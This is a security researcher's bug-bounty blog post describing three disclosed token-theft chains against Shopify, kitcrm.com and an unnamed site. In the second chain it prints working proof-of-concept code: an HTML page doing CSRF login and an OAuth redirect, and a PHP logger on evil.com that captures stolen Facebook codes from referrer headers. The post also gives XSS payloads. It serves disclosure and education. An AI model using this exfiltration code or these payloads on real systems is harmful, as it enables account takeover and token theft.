---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-06-11_lets-steal-some-tokens.md
original_filename: 2017-06-11_lets-steal-some-tokens.md
title: Let’s steal some tokens!
category: documents
detected_topics:
- oauth
- xss
- command-injection
- otp
- cors
- csrf
tags:
- imported
- documents
- oauth
- xss
- command-injection
- otp
- cors
- csrf
language: en
raw_sha256: 9e224ed1bedaa83ef81dbface35aa65b0f6f5a697ba2a881ab73e45d65bf4c2f
text_sha256: 1e2a932bab03aa52ef301af98a15fe2042956a47fb5638a0147e62a8ab7d260c
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Let’s steal some tokens!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-06-11_lets-steal-some-tokens.md
- Source Type: markdown
- Detected Topics: oauth, xss, command-injection, otp, cors, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `9e224ed1bedaa83ef81dbface35aa65b0f6f5a697ba2a881ab73e45d65bf4c2f`
- Text SHA256: `1e2a932bab03aa52ef301af98a15fe2042956a47fb5638a0147e62a8ab7d260c`


## Content

---
title: "Let’s steal some tokens!"
page_title: "Let’s steal some tokens! – Seekurity"
url: "https://www.seekurity.com/blog/general/lets-steal-some-tokens"
final_url: "https://seekurity.com/blog/2017/06/11/mahmoud-gamal/general/lets-steal-some-tokens"
authors: ["Mahmoud Gamal (@Zombiehelp54)"]
programs: ["Google", "Shopify"]
bugs: ["CSRF", "XSS", "Account takeover"]
bounty: "1,000"
publication_date: "2017-06-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6181
---

Hey There, How you doing?

Good? Cool!

In this blog post I will be talking about my experience with minor bugs chained together to steal sensitive tokens.

## #1. Stealing CSRF tokens through Google Analytics.

While randomly testing things on apps.shopify.com, I landed at some random app page and hit the **Write a review** button, I wasn’t logged in so I was redirected to the login page and after logging in I was redirected to the application page again. Ok, that’s normal. However, what wasn’t normal is that the URL I got redirected to contained this GET parameter `authenticity_token=[CSRF_TOKEN]`.

![](https://2.bp.blogspot.com/-41zIXRmYubg/WIiAbV1sAPI/AAAAAAAAEeI/FxYmRCIk6LQ9GIXRqwBnN8kGGS6qlwv2ACLcB/s1600/shopify.png) Yummy!!!

I know Shopify allow you to add rich text to your application’s description,so I just thought I will load an image from my server and get the token from the referer header, or add a link to it and trick the victim to click it.

![](https://2.bp.blogspot.com/-n51t11gk32M/WTNiP5RksrI/AAAAAAAAEi8/XKcx5xjfv303rtww9n3onwe_L9ySdUM8QCLcB/s320/Leonardo-DiCaprio-Absolutely-fucking-not.gif)

Yup, that didn’t work, the only tags allowed were:

`<a> <b> <blockquote> <h2> <h3> <i> <li> <ol> <p> <ul>`

If only external images were allowed, I would be able to add an image like `<img src=//myserver/log.php>` then log the referrer header, but unfortunately it wasn’t. Also, `<a>` tag was not working (maybe some server error?), whatever I didn’t want to steal the token with it anyway .. it would require too much user interaction.

Anyways, after checking the other options you can edit for your application page I found that you can actually add your own Google Analytics tracking code and I got the idea to steal the token through Google Analytics which I did And it worked!

![](https://seekurity.com/blog/wp-content/uploads/2017/06/csrf-token-analytics-1.png)

The report is publicly disclosed in: https://hackerone.com/reports/196458

## #2. Chaining minor bugs to steal facebook codes

I have more that an example on this type of bugs, one of them is already publicly disclosed on HackerOne here: https://hackerone.com/reports/211477 it will give you the idea about how this kind of bugs work.

I have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user’s facebook access token provided for kitcrm.com

  * In kitcrm.com, users register with their shopify account and the products in their store appear in **Priority Products** section.
  * When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.
  * Users can set their product image to anything, for example `http://evil.com/` will be accepted and added as the product image.
  * Now each time the user visits `https://www.kitcrm.com/seller/onboarding/1`, the page will request `http://evil.com/` as an image.
  * In `https://[shop].myshopify.com` there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)
  * Users of `kitcrm.com` are authenticated automatically by visiting the endpoint `https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com` which redirects to `https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....` then they are redirected back to `kitcrm.com` and logged in.
  * Current `redirect_uri` configuration for Kitcrm facebook oauth application allows redirection to `https://www.kitcrm.com/<ANYTHING>`

Chaining all of what I mentioned above together, here is how an attacker will be able to steal users’ facebook access tokens:

  * An attacker registers a shopify store and then uses it to register a `kitcrm.com` account.
  * After that he modifies his priority product image url to `https://evil.com/log_token.php`
  * Then he tricks the victim into visiting a specially crafted HTML page that will: 
  * CSRF login the victim into the attacker’s store
  * CSRF login the victim into `kitcrm.com`
  * Redirect the victim to `https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type....`which will redirect him back to `https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]`
  * After the victim is redirected from facebook to kitcrm.com, a request will be sent to `https://evil.com/log_token.php` with the code returned from facebook in the referrer header.
  * Now the attacker can store the token at his server and use it to access the user’s facebook account.

PoC Code:

> Steal.html
  
  
  <script>
  window.onload = function () { 
  window.setTimeout(function() {
  document.getElementById("token").innerHTML = "<iframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'></iframe>";  
  }, 5000);
  window.setTimeout(function() {
  window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');
  }, 10000);
  finished = 0;
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200 && this.responseText.length > 0) {
  document.getElementById("token").innerHTML = "<b>Your access token is: <br></b>" +this.responseText;
  alert(this.responseText);
  finished = 1;
  }
  };
  function fetchToken(){ 
  xhttp.open("GET", "tokens.log?"+Math.random(), true);
  xhttp.send();
  if (finished == 1){
  clearInterval(interval);
  }
  }
  var interval = setInterval(function(){ fetchToken() } , 10000);
  }
  </script>
  <h4>If no window was opened click <a href="https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages" target="_blank">here</a>: 
  
  <div id="token"><h3>Your access token should appear soon.....</h3></div>
  <iframe src='data:text/html,<form action="https://zh5409.myshopify.com/admin/auth/login" method="post">
  <input name="utf8" value=""><input name="redirect"><input name="highlight=><input name="subdomain" value=zh5409><input name="login" value=███><input name="password" value=P@SSW0RD><input name="[remember]" value=1>
  </form><script>document.forms[0].submit()</script>'></iframe>
  <div id="csrf_login"></div>

> log_token.php
  
  
  <?php
  header("Access-Control-Allow-Origin: *");
  $referrer = $_SERVER['HTTP_REFERER'];
  $token = substr($referrer, strpos($referrer, "=") + 1);  
  $fp = fopen('tokens.log', 'w');
  fwrite($fp, $token."\n");
  fclose($fp);
  ?>
  

Mitigation of this vulnerability is pretty simple, Shopify just set their facebook oauth application `redirect_uri` to the exact callback endpoint and removed the domain from the white list.

## #3. Silly XSS to Account take over

This is a private program so I won’t be mentioning anything about the vendor.

Ever heard of a silly XSS?

IMO, a silly XSS is either a XSS that works in outdated browsers only or a XSS that requires too much user interaction to be exploited.

In my case it was XSS in a hidden `<input>` tag .. So, I had my payload added like `<input type="hidden" name="foo" value="[XSS]">` and `<` was removed `str_replace($payload,'<' , '')`, I tried to bypass that but no luck.

The guys at Portswigger wrote an article about XSS in hidden <input> fields [here ](http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html). It concludes that we can XSS using `<input type="hidden" accesskey="X" onclick="alert(1)">` and the onclick event will be triggered once the victim presses ALT+SHIFT+X , but that’s too much user interaction (silly XSS) and probably won’t be granted a bounty or even accepted.

I tried my luck to find a new way to XSS in hidden fields myself, tried things like `x "style="display:block !important;visibility: visible!important; -moz-visibility: visible !important;width:1000px; height:1000px; background:black;" onmouseover="alert(1)" x` but no luck since the browser can’t give an input with type hidden a width or a height as mentioned in [W3.org](https://www.w3.org/TR/html5/forms.html#hidden-state-\(type=hidden\)).

so I tried to change the type attribute to anything other than “hidden” e.g: `x" type=text onmouseover=alert(1) x` but the browser will ignore the duplicate attribute I just added and will only consider the first one.

One of the things I tested when trying to find a way to XSS this locally was `x" type=image src=http://aaaa.com x` which actually issued a request to `http://aaaa.com` even though the type was still `hidden`!! I tested the same in firefox but it didn’t request anything, so the first thing I thought of was to report this to Google but after searching a little bit I found that it was already reported and they didn’t consider it, you can read the full report [here](https://bugs.chromium.org/p/chromium/issues/detail?id=585077).

So due to the fact that we can request any external resource through the targeted website and the website has an option for users to login using third party services such as WeChat, all what I had to do is to set the `redirect_uri` parameter to `https://vulnerable/path/to/xss/payload` and once the user completes the login process through the third party, he will be redirected to https://vulnerable/path/to/xss/payload where I have the injected HTML that will send the `code` returned from WeChat to my server and I can use that code to login to the victim’s account.

That’s it for today, feel free to ask any questions or drop me a tweet [@Zombiehelp54](https://twitter.com/Zombiehelp54)

**Hey!**  
Building a website? Or already built a one? Worried about your security? Think twice before going public and let us [protect your business](https://www.seekurity.com/#pricing)!

[](https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "Facebook")[](https://www.addtoany.com/add_to/pinterest?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "Pinterest")[](https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "Twitter")[](https://www.addtoany.com/add_to/whatsapp?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "WhatsApp")[](https://www.addtoany.com/add_to/telegram?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "Telegram")[](https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "LinkedIn")[](https://www.addtoany.com/add_to/google_gmail?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2017%2F06%2F11%2Fmahmoud-gamal%2Fgeneral%2Flets-steal-some-tokens&linkname=Let%E2%80%99s%20steal%20some%20tokens%21 "Gmail")[](https://www.addtoany.com/share)

Facebook  Let's  Shopify  some  steal  tokens
